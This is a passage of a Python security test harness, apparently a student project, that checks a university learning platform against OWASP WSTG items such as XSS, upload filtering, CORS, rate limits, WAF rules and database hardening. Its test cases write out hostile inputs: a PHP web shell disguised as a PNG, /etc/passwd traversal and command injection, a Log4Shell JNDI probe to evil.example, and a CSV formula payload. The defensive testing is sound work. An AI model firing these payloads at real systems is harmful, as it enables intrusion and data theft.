        r = L1.post(API + '/announcements', {'course_id': sec101, 'title': 'XSS ' + pl, 'body': pl})
        if r.status in (200, 201):
            lst = S1.get(API + '/announcements')
            R.check('WSTG-INPV-02', f'Stored XSS payload {pl[:22]} returned as inert JSON text',
                    lst.headers.get('content-type', '').startswith('application/json') and lst.headers.get('x-content-type-options') == 'nosniff',
                    detail_bad=str(lst.headers.get('content-type')), severity='high')
            raw = lst.text
            R.add('WSTG-INPV-02', f'Payload {pl[:22]} stored as', 'INFO', 'sanitised' if pl not in raw.replace('\\/', '/') else 'stored verbatim (Flutter renders text, not HTML; CSP blocks scripts)')
    r = S1.get(API + '/search?q=' + urllib_quote('<script>alert(1)</script>'))
    R.check('WSTG-INPV-01', 'Reflected XSS: search term is not echoed into HTML', r.headers.get('content-type', '').startswith('application/json'), detail_bad=r.headers.get('content-type'), severity='high')
    r = S1.get('/index.html?x=' + urllib_quote('<script>alert(1)</script>'))
    R.check('WSTG-INPV-01', 'Reflected XSS: static pages do not echo query strings', '<script>alert(1)' not in r.text, severity='high')

    # Host header
    r = S1.get(API + '/assignments', headers={'Host': 'evil.example'})
    R.check('WSTG-INPV-17', 'Host header injection: response links do not use an attacker host', 'evil.example' not in r.text,
            detail_bad='pagination links contain the attacker Host', severity='low')
    r = S1.get(API + '/me', headers={'X-Forwarded-Host': 'evil.example', 'X-Forwarded-Proto': 'http'})
    R.check('WSTG-INPV-17', 'X-Forwarded-Host from a client is ignored', 'evil.example' not in r.text and r.status == 200, detail_bad=f'HTTP {r.status}', severity='low')
    # header injection / CRLF
    try:
        r = S1.get(API + '/search?q=a%0d%0aSet-Cookie:%20pwned=1')
        R.check('WSTG-INPV-15', 'CRLF in a parameter does not inject headers', not any('pwned' in c for c in r.set_cookies), detail_bad=str(r.set_cookies), severity='medium')
    except Exception as e:
        R.add('WSTG-INPV-15', 'CRLF in parameter', 'PASS', f'rejected ({type(e).__name__})')

    # oversized / deep payloads
    r = S1.put(API + '/profile', {'name': 'A' * 100000})
    R.check('WSTG-INPV-20', 'Oversized field is rejected by validation (not 500)', r.status == 422, detail_bad=f'HTTP {r.status}', severity='low')
    r = S1.request('PUT', API + '/profile', raw='{"name":' + '[' * 5000 + ']' * 5000 + '}', ctype='application/json')
    R.check('WSTG-INPV-20', 'Deeply nested JSON handled without a server error', r.status < 500, detail_bad=f'HTTP {r.status}', severity='low')
    r = S1.request('PUT', API + '/profile', raw=b'x' * (12 * 1024 * 1024), ctype='application/json')
    R.check('WSTG-INPV-20', '12 MB body rejected at the edge', r.status in (400, 413, 422), detail_bad=f'HTTP {r.status}', severity='low')
    r = S1.put(API + '/profile', {'name': 'Evil\u202e\x00name\x1b[31m'})
    nm = S1.get(API + '/me').json()['user']['name']
    R.check('WSTG-INPV-20', 'Control and bidi characters are stripped from names', '\x00' not in nm and '\u202e' not in nm and '\x1b' not in nm, detail_bad=repr(nm), severity='low')
    S1.put(API + '/profile', {'name': 'Demo Student'})

    # file uploads
    def up(cli, path, name, ctype, data, field='file', fields=None):
        return cli.request('POST', API + path, files={field: (name, ctype, data)}, fields=fields)
    png = png_bytes()
    tests = [
        ('avatar: PHP disguised as PNG', '/profile/avatar', 'evil.php.png', 'image/png', b'<?php system($_GET[0]); ?>', 'avatar'),
        ('avatar: HTML as PNG', '/profile/avatar', 'x.png', 'image/png', b'<html><script>alert(1)</script></html>', 'avatar'),
        ('avatar: SVG with script', '/profile/avatar', 'x.svg', 'image/svg+xml', b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'avatar'),
        ('avatar: EICAR virus', '/profile/avatar', 'v.png', 'image/png', EICAR, 'avatar'),
        ('avatar: oversized (5 MB)', '/profile/avatar', 'big.png', 'image/png', png + b'0' * (5 * 1024 * 1024), 'avatar'),
    ]
    for title, path, name, ct, data, field in tests:
        r = up(S1, path, name, ct, data, field)
        R.check('WSTG-BUSL-08', f'Upload refused - {title}', r.status in (400, 403, 413, 422), detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='high')
    r = up(S1, '/profile/avatar', 'ok.png', 'image/png', png, 'avatar')
    R.check('WSTG-BUSL-09', 'A genuine small PNG avatar is accepted', r.status == 200, detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='low')
    # submission file upload
    a101 = [a for a in A_ASSIGN if a['course_id'] == COURSES['SEC101']][1]['id']
    r = S1.request('POST', API + f'/assignments/{a101}/submissions', files={'files[]': ('virus.txt', 'text/plain', EICAR)})
    R.check('WSTG-BUSL-09', 'Virus-containing submission file is refused', r.status in (400, 422), detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='high')
    r = S1.request('POST', API + f'/assignments/{a101}/submissions', files={'files[]': ('../../evil.php', 'text/plain', b'hello')})
    R.add('WSTG-BUSL-09', 'Submission with path-traversal file name', 'INFO', f'HTTP {r.status}')
    if r.status in (200, 201):
        d = r.json() or {}
        txt = json.dumps(d)
        R.check('WSTG-BUSL-08', 'Stored file name does not keep the traversal path', '../' not in txt, detail_bad=txt[:160], severity='high')
    r = L1.request('POST', API + '/materials', files={'file': ('lecture.pdf', 'application/pdf', b'%PDF-1.4 hello')},
                   fields={'course_id': COURSES['SEC101'], 'title': 'Lecture 1'})
    mid = (r.json() or {}).get('id')
    R.check('WSTG-BUSL-09', 'Lecturer can upload a course material', r.status in (200, 201), detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='low')
    r = BL.request('POST', API + '/materials', files={'file': ('x.pdf', 'application/pdf', b'%PDF-1.4 hello')},
                   fields={'course_id': COURSES['SEC101'], 'title': 'Cross tenant'})
    R.check('WSTG-ATHZ-04', 'Other-university lecturer cannot upload to our course', r.status in (403, 404, 422), detail_bad=f'HTTP {r.status}', severity='critical')
    r = S1.request('POST', API + '/materials', files={'file': ('x.pdf', 'application/pdf', b'%PDF')}, fields={'course_id': COURSES['SEC101'], 'title': 'Student upload'})
    R.check('WSTG-ATHZ-02', 'Student cannot upload course materials', r.status == 403, detail_bad=f'HTTP {r.status}', severity='high')
    if mid:
        d1 = S1.get(API + f'/materials/{mid}/download')
        R.check('WSTG-ATHZ-04', 'Enrolled student downloads the material with safe headers',
                d1.status == 200 and d1.headers.get('x-content-type-options') == 'nosniff' and 'attachment' in d1.headers.get('content-disposition', ''),
                detail_bad=f"HTTP {d1.status} cd={d1.headers.get('content-disposition')}", severity='medium')
        d2 = BS.get(API + f'/materials/{mid}/download')
        R.check('WSTG-ATHZ-04', 'Student of another university cannot download it', d2.status in (403, 404), detail_bad=f'HTTP {d2.status}', severity='critical')
        d3 = Client('direct').get(API + f'/materials/{mid}/download')
        R.check('WSTG-ATHZ-04', 'Anonymous cannot download it', d3.status == 401, detail_bad=f'HTTP {d3.status}', severity='critical')
    # CSV injection on import (formula in name)
    r = UA.request('POST', API + '/imports/users', files={'file': ('u.csv', 'text/csv', b'name,email,role,password\n=cmd|calc!A0,formula@margin.test,student,Gr3at-Passphrase-Here!\n')})
    export = UA.get(API + f'/courses/{COURSES["SEC101"]}/grades.csv')
    R.add('WSTG-INPV-18', 'CSV formula injection (=cmd) in imported names', 'INFO',
          'exported CSV: ' + ('formula cells are prefixed' if "'=cmd" in export.text or '\t=cmd' in export.text else 'check manually if names reach exports'))


def urllib_quote(s):
    import urllib.parse
    return urllib.parse.quote(s, safe='')


# ---------------------------------------------------------------- CLNT / CORS / RATE
def client_side_and_limits():
    c = Client('direct', browser=False)
    for origin in ('https://evil.example', 'null', 'http://localhost:8088.evil.example'):
        r = c.request('OPTIONS', API + '/me', headers={'Origin': origin, 'Access-Control-Request-Method': 'GET', 'Sec-Fetch-Site': 'cross-site'}, xsrf=False)
        acao = r.headers.get('access-control-allow-origin')
        R.check('WSTG-CLNT-07', f'CORS: Origin {origin} is not granted access', acao not in (origin, '*') ,
                detail_bad=f'ACAO={acao}', severity='high')
    r = c.request('OPTIONS', API + '/me', headers={'Origin': 'http://localhost:8088', 'Access-Control-Request-Method': 'GET'}, xsrf=False)
    R.check('WSTG-CLNT-07', 'CORS: the real site origin is allowed and not wildcarded', r.headers.get('access-control-allow-origin') in ('http://localhost:8088', None) and r.headers.get('access-control-allow-origin') != '*', severity='medium')
    # clickjacking
    r = c.get('/', xsrf=False)
    R.check('WSTG-CLNT-09', 'Site cannot be framed (X-Frame-Options + frame-ancestors)', r.headers.get('x-frame-options') == 'DENY' and "frame-ancestors 'none'" in r.headers.get('content-security-policy', ''), severity='medium')

    # rate limits
    s = login('student2@margin.test')
    codes = [s.get(API + '/courses').status for _ in range(130)]
    R.check('WSTG-APIT-02', 'API throttle (120/min) returns 429 under a burst of 130 requests', 429 in codes, detail_bad=f'no 429: {set(codes)}', severity='medium')
    me_codes = [s.get(API + '/me').status for _ in range(60)]
    R.add('WSTG-APIT-02', '/me burst of 60 requests', 'INFO', f'{set(me_codes)} (note: /me has no per-route throttle in margin_auth.php)')
    clear_throttle()


# ---------------------------------------------------------------- WAF
def waf():
    c = Client('waf')
    c.csrf()
    attacks = [
        ('SQL injection in query', 'GET', API + "/courses?search=1%27%20OR%20%271%27%3D%271"),
        ('UNION SELECT', 'GET', API + "/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users"),
        ('XSS in query', 'GET', API + '/search?q=%3Cscript%3Ealert(1)%3C/script%3E'),
        ('path traversal', 'GET', '/..%2f..%2f..%2fetc/passwd'),
        ('LFI php wrapper', 'GET', API + '/search?q=php://filter/convert.base64-encode/resource=/etc/passwd'),
        ('command injection', 'GET', API + '/search?q=%3Bcat%20/etc/passwd'),
        ('Log4Shell probe', 'GET', API + '/search?q=%24%7Bjndi:ldap://evil.example/a%7D'),
    ]
    for title, m, path in attacks:
        r = c.request(m, path, xsrf=False)
        R.check('WAF', f'Firewall blocks: {title}', r.status in (400, 403), detail_bad=f'HTTP {r.status}', severity='medium')
    for ua in ('sqlmap/1.7.2', 'Nikto/2.5.0', 'Mozilla/5.0 (compatible; Nmap Scripting Engine)', 'masscan/1.3', 'zgrab/0.x'):
        r = Client('waf', ua=ua).get(API + '/me', xsrf=False)
        R.check('WAF', f'Firewall blocks scanner user-agent {ua[:18]}', r.status == 403, detail_bad=f'HTTP {r.status}', severity='low')
    # no false positives for ordinary use
    ok = Client('waf')
    r = ok.login('student2@margin.test', PW)
    R.check('WAF', 'Normal login passes the firewall', r.status == 200, detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='medium')
    r = ok.put(API + '/profile', {'name': "Sara O'Brien-Smith (Team lead) & co."})
    R.check('WAF', 'Names with apostrophes, hyphens, parentheses and ampersands are not blocked', r.status == 200, detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='low')
    r = ok.put(API + '/profile', {'name': "Sara O'Brien (SELECT team)"})
    R.add('WAF', 'A name containing SQL keywords in parentheses', 'INFO', f'HTTP {r.status} (the firewall may treat SQL-looking text as an attack: accepted trade-off at paranoia level 1)')
    ok.put(API + '/profile', {'name': 'Second Student'})
    r = ok.request('POST', API + '/profile/avatar', files={'avatar': ('a.png', 'image/png', png_bytes())})
    R.check('WAF', 'A genuine image upload passes the firewall', r.status == 200, detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='medium')
    a101 = [a for a in A_ASSIGN if a['course_id'] == COURSES['SEC101']][0]['id']
    r = ok.post(API + f'/assignments/{a101}/submissions', {'content': 'I used SELECT * FROM students WHERE name = "x" in my report; it is just text <b>bold</b>.'})
    R.check('WAF', 'Coursework text containing SQL/HTML words is not blocked', r.status in (200, 201), detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='medium')
    # direct comparison: application-level answer to one blocked payload
    d = Client('direct'); d.login('student2@margin.test', PW)
    r = d.get(API + "/courses?search=1%27%20OR%20%271%27%3D%271")
    R.check('WAF', 'Same SQL payload straight at the app (no firewall) is harmless', r.status < 500 and 'SQLSTATE' not in r.text, detail_bad=f'HTTP {r.status}', severity='high')


# ---------------------------------------------------------------- DB / TLS (infra)
def infrastructure():
    base = r'C:\Users\hanaa\Desktop\uni\sems 7\security\MarginSecureLMS\deploy\local'

    def sh(cmd):
        return subprocess.run(cmd, shell=True, cwd=base, capture_output=True, text=True, timeout=120).stdout.strip()
    ssl = sh('docker compose exec -T db psql -U postgres -At -c "select count(*) from pg_stat_ssl s join pg_stat_activity a using(pid) where a.usename=\'margin_runtime\' and s.ssl"')
    R.check('WSTG-CRYP-03', 'App-to-database connections use TLS', ssl.isdigit() and int(ssl) >= 1, detail_bad=ssl, severity='high')
    pub = sh('docker compose ps --format "{{.Name}} {{.Ports}}"')
    R.check('WSTG-CONF-01', 'Database port is not published on the host', 'db-1' in pub and '5432->' not in pub, detail_bad=pub[:200], severity='critical')
    rls = sh('docker compose exec -T db psql -U postgres -d margin_db -At -c "select rolsuper::text||rolbypassrls::text from pg_roles where rolname=\'margin_runtime\'"')
    R.check('WSTG-CONF-01', 'Runtime DB account is neither superuser nor RLS-bypassing', rls == 'falsefalse', detail_bad=rls, severity='critical')
    dbg = sh('docker compose exec -T app sh -c "echo $APP_DEBUG:$APP_ENV"')
    R.check('WSTG-ERRH-01', 'APP_DEBUG=false and APP_ENV=production in the running container', dbg == 'false:production', detail_bad=dbg, severity='high')
    env = sh('git ls-files deploy/local/.env backend/.env')
    R.check('WSTG-CONF-03', 'Secret .env files are not tracked by git', env == '', detail_bad=env, severity='critical')
    R.add('WSTG-CRYP-01', 'TLS between browser and site', 'INFO', 'provided by the Cloudflare tunnel once public; not testable on http://localhost')


def _start_cleanup():
    """Remove what this run creates in the demo database when it ends (see cleanup.py)."""
    if '--keep-data' in sys.argv:
        print('--keep-data: test data is left in the database.')
        return
    import atexit
    import cleanup
    since = cleanup.db_now()
    atexit.register(lambda: cleanup.report(cleanup.cleanup(since)))


def main():
    _start_cleanup()
    setup()
    for fn in (info_conf, sessions, authorization, input_validation, client_side_and_limits, waf, infrastructure, identity_authn):
        print(f'\n=== {fn.__name__} ===')
        try:
            fn()
        except Exception as e:  # keep going; a crash is itself worth reading
            import traceback
            traceback.print_exc()
            R.add('HARNESS', f'{fn.__name__} crashed', 'INFO', f'{type(e).__name__}: {e}')
    fails = [r for r in R.rows if r['status'] == 'FAIL']
    print(f"\n{len(R.rows)} checks: {sum(r['status']=='PASS' for r in R.rows)} pass, {len(fails)} fail, {sum(r['status']=='INFO' for r in R.rows)} info")
    out = None
    if '--json' in sys.argv:
        out = sys.argv[sys.argv.index('--json') + 1]
        json.dump(R.rows, open(out, 'w', encoding='utf-8'), indent=1)
    return 1 if fails else 0


if __name__ == '__main__':
    sys.exit(main())
